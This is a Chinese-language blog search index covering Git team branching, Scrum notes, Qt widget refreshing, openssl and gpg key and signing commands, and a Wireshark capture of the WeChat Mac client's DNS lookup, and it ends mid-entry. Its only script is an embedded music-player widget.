<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[git-branch]]></title>
    <url>%2F2018%2F12%2F10%2Fgit-branch%2F</url>
    <content type="text"><![CDATA[团队中使用Git分支开发和版本管理准备 创建代码库 模拟两个人员 这里我已经在阿里云上创建好库 为了模拟两个人员，我这里通过创建两个不通的文件夹，但是git 远程仓库是一样的。 我们来创建各自的本地维护的分支，一般可以自身名字来命名（这里假设是小明和小红）： 小明这么干： 1234# 创建xm分支git branch xm# 切换xm分支git checkout xm 小红这么干： 12# 创建xh分支,并且切换至xh分支git checkout -b xh 创建功能分支我们应该推崇当开发新功能的时候，应该创建一个新的分支。 小明要开发会员管理新功能： 123# 创建feature_user分支用于开发会员管理,# 并且切换至feature_user分支git checkout -b feature_user 小红要开发角色管理的新功能： 123# 创建feature_role分支用于开发角色管理,# 并且切换至feature_role分支git checkout -b feature_role 12# 查看git 日志 ,简约单行带上分支图git log --graph --pretty=oneline --abbrev-commit 我们已经看到他们在各子本地的功能分支上完成了功能的实现，现在把他们的功能分支融合在他们的个人的分支上。小明： 12git checkout xmgit merge feature_user 小红： 12git checkout xhgit merge feature_role 推送至远程dev分支，触发开发环境构建部署他们在本地已经通过新建分支完成功能，并且融合到他们的个人分支上了，那么我们需要一个远程仓库来整合他们的代码。这里常见的远程分支有master,dev,test。我们定义master是主要用来控制大版本的分支，dev是开发者日常同步其他人代码的分支，test是需要待测试时推的分支。 小明把他的个人分支推送到dev上，做线上开发环境的自测： 123# 由于远程仓库还没有dev分支,就不用先git pull origin dev# 把个人推送至origin/devgit push origin xm:dev 小红把他的个人分支推送到dev上，做线上开发环境的自测： 1234# 拉取别人的代码git pull origin dev# 把个人推送至origin/devgit push origin xh:dev 代码都同步到远程仓库的dev分支上了，如果阿里云上的流水线实时监控dev，那么就已经开始构建任务和部署任务了。 分析branch通过git branch -a 可以查看本地和远程仓库的分支，如上图，绿色是远程分支，黄色时他们各自本地分支。 分析log通过上图，发现有两条竖立的线，每条线是属于某个人的 commit 记录连线，‘*’号表示一个 commit 记录。 推送至远程分支test,触发测试环境的构建部署小明： 1234567# on xm branch# 拉取别人的代码，更新个人分支git pull origin dev# 更新至dev 触发开发环境构建部署，进行自测git push origin xm:dev# 更新至test ,触发测试环境构建部署，测试人员进行测试git push origin xm:test 开发认为任务开发完成了，这时需要编写邮件发送给对应的测试人员，内容： 实现的功能列表 一个带测试的接口列表 抄送给项目组所有人 另外，开发人员在云效上修改任务为待测试 最后，测试人员测试完后，直接回复该邮件，有无缺陷，是否通过。 修复缺陷分支当小明提交了用户管理去测试环境后，他不应该等待测试结果才继续工作的。假设小明又接了一个任务，编写订单模块。同样的需要创建一个功能分支feature_order 1git checkout -b feature_order 小明还没有完成订单功能，测试那边就说用户管理出bug了，所以小明应该回去他那功能分支上，因为那里是最后一次编写用户管理 12345678git checkokut feature_uservim user.htmlgit add .git commit -m '修复用户管理bug' #功能分支上修复了git checkout xmgit merge feature_user #融合feature_user到个人分支上来git push origin xm:dev #推送至开发环境的远程分支git push origin xm:test #自测后，推送至测试环境 小明在用户管理分支和个人分支上的修改，并提交至测试，并没有上传相关订单的代码。因为订单管理的分支还没有合并进来个人分支。 小明修复好bug后，高高兴兴地回来feature_order分支上开发订单了。 1git checkout feature_order]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>branch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s-2]]></title>
    <url>%2F2018%2F12%2F03%2Fk8s-2%2F</url>
    <content type="text"><![CDATA[常用命令强制性删除pokubectl delete pod –grace-period=0 –force -n]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习-基于用户画像推荐算法]]></title>
    <url>%2F2018%2F10%2F25%2Fmachine-study-4%2F</url>
    <content type="text"><![CDATA[目录 用户画像及商品画像的特征挖掘 归一化介绍 逻辑回归算法介绍 ]]></content>
      <categories>
        <category>Machine-Study</category>
        <category>推荐算法</category>
      </categories>
      <tags>
        <tag>Machine-Study</tag>
        <tag>用户画像</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习-基于协同过滤推荐算法]]></title>
    <url>%2F2018%2F10%2F24%2Fmachine-study-3%2F</url>
    <content type="text"><![CDATA[目录 推荐系统介绍 实战从PAI中，使用模版创建的商品推荐。得到： 其中训练数据为： 我们把其中购买的数据筛选出来 active_type=1 ： 我们把协同过滤算法拿过来，我们这里是ICF基于商品的。设置user_id列和商品item_id列 设置topN为1，就是输出一个最有可能一起买的商品. 得到结果： 整理： 再整理： 把预测的和真实交易的数据进行合并，来验证预测的准确度 预测数量： 准确度为60/18065]]></content>
      <categories>
        <category>Machine-Study</category>
        <category>推荐算法</category>
      </categories>
      <tags>
        <tag>Machine-Study</tag>
        <tag>协同过滤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习实验工具PAI的介绍]]></title>
    <url>%2F2018%2F10%2F22%2Fmachine-study-2-caffe%2F</url>
    <content type="text"><![CDATA[Caffe实验图像分类 视频入口 PAI-Caffe平台 PAI-Caffe特性 实战PAI-Caffe 机器学习实验工具概述 企业级机器学习工具 机器学习PAI介绍 PAI用法介绍]]></content>
      <categories>
        <category>Machine-Study</category>
      </categories>
      <tags>
        <tag>Machine-Study</tag>
        <tag>Caffe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习知识背景]]></title>
    <url>%2F2018%2F10%2F22%2Fmachine-study-1-background%2F</url>
    <content type="text"><![CDATA[机器学习入门观看阿里云视频教程的笔记 适合人群]]></content>
      <categories>
        <category>Machine-Study</category>
        <category>Starter</category>
      </categories>
      <tags>
        <tag>Machine-Study</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrum-7]]></title>
    <url>%2F2018%2F10%2F19%2Fscrum-7%2F</url>
    <content type="text"><![CDATA[scrum 迭代与用户故事迭代在瀑布式开发中我们的步子迈的太大了，导致我们首先无法快速应对变化，其次我们需要付出很大的代价来应对变化。而敏捷迭代开发则可以让我们小步的往前走，以一种增量式的模式来进行开发。那么敏捷迭代中迭代的是什么呢？我觉得迭代的交付可工作的软件。 首先，我们看看敏捷迭代大致的流程： 首先和用户讨论需求，定义系统的personas，并将用户需求划分成一个个的用户故事 和用户一起将所有的用户故事按照关联和优先级划分到一个个的迭代之中 保证在每个迭代都可以交付给用户可工作的软件 用户故事用户故事必须满足INVEST原则： Independence：一个和其他用户故事紧密关联的用户故事会给我们的开发带来很大的麻烦，使我们在开发中不得不考虑相关联的用户故事。 Negotiable：用户故事应该是我们可以和用户协商的，因为完成任何一件事情往往都很多不同的途径。 Valuable：用户故事必须是有价值的，如果这个用户故事对于用户而言没有任何价值，我们的开发也就没有任何意义。 Estimate：如果一个用户故事的开发时间不可估计，那么对于我们迭代将是非常大的风险。 Small：足够小的用户故事可以让我的步子迈的小一点，这样当需求变了我们我们的浪费也就相对小。 Testable：如果一个用户故事不可测试，那么我们如何知道这个用户故事我们是否完成了呢？]]></content>
  </entry>
  <entry>
    <title><![CDATA[scrum-6]]></title>
    <url>%2F2018%2F10%2F17%2Fscrum-6%2F</url>
    <content type="text"><![CDATA[scrum-模式刘模式 QUML + Scrum 模式持续交付]]></content>
      <categories>
        <category>scrum</category>
      </categories>
      <tags>
        <tag>scrum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrum-5]]></title>
    <url>%2F2018%2F10%2F17%2Fscrum-5%2F</url>
    <content type="text"><![CDATA[scrum-评审会和反思会评审会 反思会 抱怨会，或推责任，这是不好的。]]></content>
      <categories>
        <category>scrum</category>
      </categories>
      <tags>
        <tag>scrum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrum-4]]></title>
    <url>%2F2018%2F10%2F17%2Fscrum-4%2F</url>
    <content type="text"><![CDATA[scrum 估算工作时间（估算时间 - 讨论会 ）*0.5~0.7[ 0.5~0.7 的系数是修bug导致的 ] 扑克牌故事 各自估计 最高值与最高值讨论 重新估算 达到近似一致 达到需求和方法一致，不要求工作能力一致 每日立会5~8个人3个问题： 昨天做了什么？ （有人需要我做的东西吗） 今天准备做什么？ 在工作中遇到了哪些困难?(别人有意见) 进度问题* 敏捷的生态系统： 燃尽图任务看板开发中的数量，控制带1～2个·]]></content>
      <categories>
        <category>scrum</category>
      </categories>
      <tags>
        <tag>scrum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrum-3]]></title>
    <url>%2F2018%2F10%2F17%2Fscrum-3%2F</url>
    <content type="text"><![CDATA[scrum 敏捷开发3-角色ProductOwner 产品负责人负责的事情 编写用户故事 确定用户故事优先级 解析用户故事 （计划会和开发过程中） 验收产品 人员 产品总监(老板) 负责决策，预测，定义产品 产品经理（对外） 调研，分析市场，客户拜访 产品经理（对内）(开发骨干) 描述，跟进，细化需求 重要会议计划会议 对于一种事情，有一种人就说说而已，一种人真的是拼了老命来做事。处于猪的角色应该获得更多的发言权，处于鸡的角色应该多聆听和多质疑。猪和鸡需要达到一个平衡。 讲故事使用QML Scrum Master负责的事情 维持Scrum各种活动的秩序 帮助团队解决非技术问题 发现过程中的问题 人员 高层经理? 项目经理(最常见) 质量保证人员? 从项目经理到Scrum Master 管理 vs 领导 过程 vs 文化 指令 vs 目标 领导压力 vs 同行压力 转变：发任务-组织估算任务时间每日立会-大家讨论如何解决问题，相互帮助 The Team不是： 执意提新需求 执意安排优先级 是： 对不清晰的需求提出质疑 通过质疑帮做owner分解需求 通过疑问弄清楚何为当前最急迫的需求 帮助owner分析哪些需求会影响到架构]]></content>
      <categories>
        <category>scrum</category>
      </categories>
      <tags>
        <tag>scrum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrum-2]]></title>
    <url>%2F2018%2F10%2F16%2Fscrum-2%2F</url>
    <content type="text"><![CDATA[scrum 敏捷开发-2scrum 敏捷开发方法中的工作产品内容如图： 避免把任务分得太细，未来的需求是变化的。 把优先级的任务先完成。]]></content>
      <categories>
        <category>scrum</category>
      </categories>
      <tags>
        <tag>scrum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrum敏捷开发-1]]></title>
    <url>%2F2018%2F10%2F16%2Fscrum-1%2F</url>
    <content type="text"><![CDATA[scrum 敏捷开发-1定义scrum 本意是指橄榄球中“带球过人”，有以下两个特点： 带球过人需要计划 带球过人需要灵活应变 scrum中既有计划会，每日立会，评审会等计划和管理活动，又有迭代期内的灵活应变活动，是一种轻重结合的敏捷过程。]]></content>
      <categories>
        <category>scrum</category>
      </categories>
      <tags>
        <tag>scrum</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qt-update-ui]]></title>
    <url>%2F2018%2F09%2F25%2Fqt-update-ui%2F</url>
    <content type="text"><![CDATA[(function(){ function loadcplayer() { if (typeof window.cplayerList === 'undefined') window.cplayerList = {}; if (typeof window.cplayerList["cplayer-02310837"] !== 'undefined') return; if (!cplayer.prototype.add163) cplayer.prototype.add163 = function add163(id) { if (!id) throw new Error("Unable Property."); return fetch("https://music.huaji8.top/?id=" + id).then(function(res){return res.json()}).then(function(data){ let obj = { name: data.info.songs[0].name, artist: data.info.songs[0].ar.map(function(ar){ return ar.name }).join(','), poster: data.pic.url, lyric: data.lyric.lyric, sublyric: data.lyric.tlyric, src: data.url.url } this.add(obj); return obj; }.bind(this)) } window.cplayerList["cplayer-02310837"] = new cplayer({ element: document.getElementById("cplayer-02310837"), playlist: [{"name":"チルドレンレコード","artist":"96猫,伊東歌詞太郎","poster":"https://cplayer.js.org/801422833716a4f0f96ff6dff1f77dfe.jpg","src":"https://cplayer.js.org/8af423669c27d265bb129d04a927044f.mp3"}], generateBeforeElement: true, deleteElementAfterGenerate: true, autoplay: true }); window.cplayerList["cplayer-02310837"].add163(525278524) } if (typeof window.cplayer === 'undefined' && !document.getElementById("cplayer-script")) { var js = document.createElement("script"); js.src = 'https://cdn.jsdelivr.net/gh/MoePlayer/cPlayer/dist/cplayer.js'; js.id = "cplayer-script"; js.addEventListener("load", loadcplayer); document.body.appendChild(js); } else { window.addEventListener("load", loadcplayer); } })() test update()函数，实质上是调用了repaint函数，但是不是同步的，就是repaint函数可能不会立即执行。调用多次update()可能只执行了一次repaint（）函数。 void QWidget::update()2.就是直接调用repaint()函数，如果这个控件不是disable状态或者不是隐藏状态，它将直接调用paintEvent()函数。如果你需要立刻刷新，官方也建议之间是用repaint()函数。 void QWidget::repaint()3.如果以上都不行，你也可以试试以下这个方法。showNormal（），它也许会有用。 void QWidget::showNormal()4.使用resize（）函数。可以这样调用this-&gt;resize(this-&gt;size()); void resize(const QSize &amp;)5.终极大招为 adjust()函数，一般情况下直接使用这个函数，就能进行界面的实时调整 void QWidget::adjustSize()]]></content>
      <categories>
        <category>QT</category>
      </categories>
      <tags>
        <tag>QT</tag>
        <tag>页面刷新</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[encrypt]]></title>
    <url>%2F2018%2F09%2F20%2Fencrypt%2F</url>
    <content type="text"><![CDATA[非对称算法概念非对称加密算法：它需要使用不同的密钥来分别完成加密和解密操作，一个公开发布，即公开密钥，另一个由用户自己秘密保存，即私用密钥。 用途第一种用法：公钥加密，私钥解密。—用于加解密第二种用法：私钥签名，公钥验签。—用于签名有点混乱，不要去硬记，总结一下:你只要想：既然是加密，那肯定是不希望别人知道我的消息，所以只有我才能解密，所以可得出公钥负责加密，私钥负责解密；既然是签名，那肯定是不希望有人冒充我发消息，只有我才能发布这个签名，所以可得出私钥负责签名，公钥负责验证。 第一种用法，能防止信息内容被他人获取，但可以被他人篡改。第二种用法，能防止信息内容被他人篡改，但可以被他人获取。 所以人们习惯公私钥一起使用，拿对方的公钥加密，用自己的私钥签名。这样的信息既可以防止被获取，又防止被篡改。 证书非对称算法，常用的场景是证书颁发与使用。证书是一个经证书授权中心签过名的包含公钥及公钥拥有者信息的文件。证书授权中心（CA）对证书签名的过程即为证书的颁发过程。证书里面的公钥只属于某一个实体（网站，个人等），它的作用是防止一个实体伪装成另外一个实体。 证书可以保证非对称加密算法的合理性，假设现有一个证书授权中心Q, 其中A和B的通话过程如下：A ——-&gt; Hello (明文) ———&gt; BA &lt;——- Hello (明文) ———- BA &lt;—— B 发送证书X 给 A ——- BA ——- 密 文 —————–&gt; BA &lt;—— 明 文 + 签 名 ———– B 其中证书X 是由一个证书授权中心Q 颁发给B的，那么B就可以把证书展示给A看，证书X 上的公钥是B的。A呢就可以通过证书授权中心Q 下载证书T，使用证书T上的公钥来验签证书X上的签名，看看证书X是不是由该证书授权中心Q 颁发的,拥有人是不是B，过没过期等。验证没问题后，A就使用证书X 上的公钥加密，发送被B，B就可以使用他的私钥进行解密了。然后B就可以发明文与对应的签名给A，A就可以使用证书X上的公钥进行验签。 升级：A &lt;—— B 发送证书X 给 A ——- BA ——- A 发送证书Y 给 B ——-&gt; BA ——- 密 文 + 签 名 ———-&gt; BA &lt;—— 密 文 + 签 名 ———– B 既可以防止信息内容被获取，又可以防止信息内容被篡改 生成SSL自签正式在密码学中，X.509是一个标准，规范了公开秘钥认证、证书吊销列表、授权凭证、凭证路径验证算法等X.509证书包含三个文件：key，csr，crt： key是服务器上的私钥文件，用于对发送给客户端数据的加密，以及对从客户端接收到数据的解密 csr是证书签名请求文件，用于提交给证书颁发机构（CA）对证书签名 crt是由证书颁发机构（CA）签名后的证书，或者是开发者自签名的证书，包含证书持有人的信息，持有人的公钥，以及签署者的签名等信息 生成私钥openssl genrsa -des3 -out server.key 1024说明：生成rsa私钥，des3算法，2048位强度，server.key是秘钥文件名。 注意：生成私钥，需要提供一个至少4位的密码。 1024位RSA非对称密钥对已经变得不安全了，所以，美国国家标准技术研究院( NIST )要求停止使用不安全的1024位非对称加密算法。微软已经要求所有受信任的根证书颁发机构必须于2010年12月31日之前升级其不安全的1024位根证书到2048位和停止颁发不安全的1024位用户证书，12 月 31 日之后会把不安全都所有 1024 位根证书从 Windows 受信任的根证书颁发机构列表中删除！ 而目前几乎所有自签证书都是1024位，自签根证书也都是1024位，当然都是不安全的。还是那句话：由于部署自签SSL证书而无法获得专业SSL证书提供商的专业指导，根本就不知道1024位已经不安全了。 生成CSR（证书签名请求）生成私钥之后，便可以创建csr文件了。 此时可以有两种选择。理想情况下，可以将证书发送给证书颁发机构（CA），CA验证过请求者的身份之后，会出具签名证书（很贵）。 另外，如果只是内部或者测试需求，也可以使用OpenSSL实现自签名，具体操作如下： openssl req -new -key server.key -out server.csr 说明：需要依次输入国家，地区，城市，组织，组织单位，Common Name和Email。其中Common Name，可以写自己的名字或者域名， 如果要支持https，Common Name应该与域名保持一致，否则会引起浏览器警告。 删除私钥中的密码 在第1步创建私钥的过程中，由于必须要指定一个密码。而这个密码会带来一个副作用，那就是在每次Apache启动Web服务器时，都会要求输入密码， 这显然非常不方便。要删除私钥中的密码，操作如下： openssl rsa -in server.key -out server.key 生成自签名证书如果你不想花钱让CA签名，或者只是测试SSL的具体实现。那么，现在便可以着手生成一个自签名的证书了。 需要注意的是，在使用自签名的临时证书时，浏览器会提示证书的颁发机构是未知的。 openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt 说明：crt上有证书持有人的信息，持有人的公钥，以及签署者的签名等信息。当用户安装了证书之后，便意味着信任了这份证书，同时拥有了其中的公钥。证书上会说明用途，例如服务器认证，客户端认证，或者签署其他证书。当系统收到一份新的证书的时候，证书会说明，是由谁签署的。如果这个签署者确实可以签署其他证书，并且收到证书上的签名和签署者的公钥可以对上的时候，系统就自动信任新的证书。 安装私钥和证书 将私钥和证书文件复制到Apache的配置目录下即可，在Mac 10.10系统中，复制到/etc/apache2/目录中即可。 gpg命令 已经把Dravin&#100;&#114;&#97;&#118;&#105;&#110;&#x2e;&#x68;&#x6f;&#116;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#109;的公钥上传至pgpkeys.mit.edu 查看列表 12gpg -kgpg --list-keys 生成一对 1gpg --gen-key 输出密钥armor参数可以将其转换为ASCII码显示。1 gpg --armor --output public-key.txt --export [用户ID] “用户ID”指定哪个用户的公钥，output参数指定输出文件名（public-key.txt）。类似地，export-secret-keys参数可以转换私钥。 1gpg --armor --output private-key.txt --export-secret-keys [用户ID] 上传公钥公钥服务器是网络上专门储存用户公钥的服务器。send-keys参数可以将公钥上传到服务器。1 gpg --keyserver pgpkeys.mit.edu --send-keys [用户ID] 使用上面的命令，你的公钥就被传到了服务器subkeys.pgp.net，然后通过交换机制，所有的公钥服务器最终都会包含你的公钥。由于公钥服务器没有检查机制，任何人都可以用你的名义上传公钥，所以没有办法保证服务器上的公钥的可靠性。通常，你可以在网站上公布一个公钥指纹，让其他人核对下载到的公钥是否为真。fingerprint参数生成公钥指纹。 查看指纹 1 gpg --fingerprint [用户ID] 导入密钥除了生成自己的密钥，还需要将他人的公钥或者你的其他密钥输入系统。这时可以使用import参数。 1gpg --import [密钥文件] 为了获得他人的公钥，可以让对方直接发给你，或者到公钥服务器上寻找。 搜索公钥 1gpg --keyserver pgpkeys.mit.edu --search-keys [用户ID] 下载公钥 1gpg --keyserver pgpkeys.mit.edu --recv-key DE885DD3 加密 假定有一个文本文件demo.txt，怎样对它加密呢？encrypt参数用于加密。1gpg --recipient [用户ID] --output demo.en.txt --encrypt demo.txt recipient参数指定接收者的公钥，output参数指定加密后的文件名，encrypt参数指定源文件。运行上面的命令后，demo.en.txt就是已加密的文件，可以把它发给对方 解密对方收到加密文件以后，就用自己的私钥解密。 gpg –decrypt demo.en.txt –output demo.de.txtdecrypt参数指定需要解密的文件，output参数指定解密后生成的文件。运行上面的命令，demo.de.txt就是解密后的文件。GPG允许省略decrypt参数。 gpg demo.en.txt运行上面的命令以后，解密后的文件内容直接显示在标准输出。 签名 对文件签名有时，我们不需要加密文件，只需要对文件签名，表示这个文件确实是我本人发出的。sign参数用来签名。1 gpg --sign demo.txt 运行上面的命令后，当前目录下生成demo.txt.gpg文件，这就是签名后的文件。这个文件默认采用二进制储存，如果想生成ASCII码的签名文件，可以使用clearsign参数。1 gpg --clearsign demo.txt 运行上面的命令后 ，当前目录下生成demo.txt.asc文件，后缀名asc表示该文件是ASCII码形式的。如果想生成单独的签名文件，与文件内容分开存放，可以使用detach-sign参数。1 gpg --detach-sign demo.txt 运行上面的命令后，当前目录下生成一个单独的签名文件demo.txt.sig。该文件是二进制形式的，如果想采用ASCII码形式，要加上armor参数。1 gpg --armor --detach-sign demo.txt 签名+加密上一节的参数，都是只签名不加密。如果想同时签名和加密，可以使用下面的命令。1 gpg --local-user [发信者ID] --recipient [接收者ID] --armor --sign --encrypt demo.txt local-user参数指定用发信者的私钥签名，recipient参数指定用接收者的公钥加密，armor参数表示采用ASCII码形式显示，sign参数表示需要签名，encrypt参数表示指定源文件。 验证签名我们收到别人签名后的文件，需要用对方的公钥验证签名是否为真。verify参数用来验证。1 gpg --verify demo.txt.asc demo.txt sha256各系统生成数字摘要的命令 type Windows Linux Mac compare with SHA-1 certUtil -hashfile file SHA1 sha1sum file shasum -a 1 file file.sha1 SHA-256 certUtil -hashfile file SHA256 sha256sum file shasum -a 256 file file.sha256 SHA-512 certUtil -hashfile file SHA512 sha512sum file shasum -a 512 file file.sha512 MD5 certUtil -hashfile file MD5 md5sum file md5 file file.md5]]></content>
      <categories>
        <category>密码学</category>
        <category>非对称算法</category>
      </categories>
      <tags>
        <tag>非对称算法</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[weixin1]]></title>
    <url>%2F2018%2F09%2F09%2Fweixin1%2F</url>
    <content type="text"><![CDATA[微信协议分析今天，我打开微信客户端mac版,然后使用wireshark进行抓包。进行简单的微信网络分析。 发现先发送一个tcp连接，来请求dns http://dns.weixin.qq.com/cgi-bin/micromsg-bin/newgetdns?uin=0&amp;clientversion=302191120&amp;scene=0&amp;net=1&amp;md5=e7642e955525f7ffbb880e98a108ec5c&amp;devicetype=imac&amp;lan=zh_CN&amp;sigver=2 获取一份xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;dns&gt;&lt;retcode&gt;0&lt;/retcode&gt;&lt;domainlist&gt;&lt;domain name="extshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.140&lt;/ip&gt;&lt;ip&gt;180.163.25.139&lt;/ip&gt;&lt;ip&gt;101.89.15.101&lt;/ip&gt;&lt;ip&gt;101.89.15.100&lt;/ip&gt;&lt;ip&gt;101.226.211.44&lt;/ip&gt;&lt;ip&gt;101.226.211.101&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="localhost" timeout="600"&gt;&lt;ip&gt;127.0.0.1&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="long.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.150&lt;/ip&gt;&lt;ip&gt;180.163.25.149&lt;/ip&gt;&lt;ip&gt;101.89.15.106&lt;/ip&gt;&lt;ip&gt;101.89.15.105&lt;/ip&gt;&lt;ip&gt;101.226.211.46&lt;/ip&gt;&lt;ip&gt;101.226.211.105&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="minorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;61.151.224.41&lt;/ip&gt;&lt;ip&gt;61.151.183.16&lt;/ip&gt;&lt;ip&gt;101.227.169.159&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="mlextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;220.171.124.105&lt;/ip&gt;&lt;ip&gt;220.171.124.102&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="mllong.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;220.171.124.107&lt;/ip&gt;&lt;ip&gt;220.171.124.104&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="mlminorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;220.171.124.105&lt;/ip&gt;&lt;ip&gt;220.171.124.102&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="mlshort.pay.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;220.171.124.11&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="mlshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;220.171.124.105&lt;/ip&gt;&lt;ip&gt;220.171.124.102&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="newyear.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.153.160.11&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sh2tjextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.140&lt;/ip&gt;&lt;ip&gt;180.163.25.139&lt;/ip&gt;&lt;ip&gt;101.89.15.101&lt;/ip&gt;&lt;ip&gt;101.89.15.100&lt;/ip&gt;&lt;ip&gt;101.226.211.44&lt;/ip&gt;&lt;ip&gt;101.226.211.101&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sh2tjlong.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;123.151.10.186&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sh2tjminorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;61.151.224.41&lt;/ip&gt;&lt;ip&gt;61.151.183.16&lt;/ip&gt;&lt;ip&gt;101.227.169.159&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sh2tjshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;123.151.10.185&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="shextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.140&lt;/ip&gt;&lt;ip&gt;180.163.25.139&lt;/ip&gt;&lt;ip&gt;101.89.15.101&lt;/ip&gt;&lt;ip&gt;101.89.15.100&lt;/ip&gt;&lt;ip&gt;101.226.211.44&lt;/ip&gt;&lt;ip&gt;101.226.211.101&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="short.pay.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.142&lt;/ip&gt;&lt;ip&gt;101.226.211.100&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="short.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.140&lt;/ip&gt;&lt;ip&gt;180.163.25.139&lt;/ip&gt;&lt;ip&gt;101.89.15.101&lt;/ip&gt;&lt;ip&gt;101.89.15.100&lt;/ip&gt;&lt;ip&gt;101.226.211.44&lt;/ip&gt;&lt;ip&gt;101.226.211.101&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="shshort.pay.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;180.163.25.142&lt;/ip&gt;&lt;ip&gt;101.226.211.100&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sz2tjextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.100&lt;/ip&gt;&lt;ip&gt;14.215.158.101&lt;/ip&gt;&lt;ip&gt;14.215.158.100&lt;/ip&gt;&lt;ip&gt;113.96.209.101&lt;/ip&gt;&lt;ip&gt;113.96.209.100&lt;/ip&gt;&lt;ip&gt;113.96.202.100&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sz2tjlong.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;123.151.10.186&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sz2tjminorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.61.46.199&lt;/ip&gt;&lt;ip&gt;14.18.245.167&lt;/ip&gt;&lt;ip&gt;14.17.42.45&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="sz2tjshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;123.151.10.185&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.224.141&lt;/ip&gt;&lt;ip&gt;14.215.158.100&lt;/ip&gt;&lt;ip&gt;113.96.209.101&lt;/ip&gt;&lt;ip&gt;113.96.209.100&lt;/ip&gt;&lt;ip&gt;113.96.202.101&lt;/ip&gt;&lt;ip&gt;113.96.202.100&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szlong.weixin.qq.com" 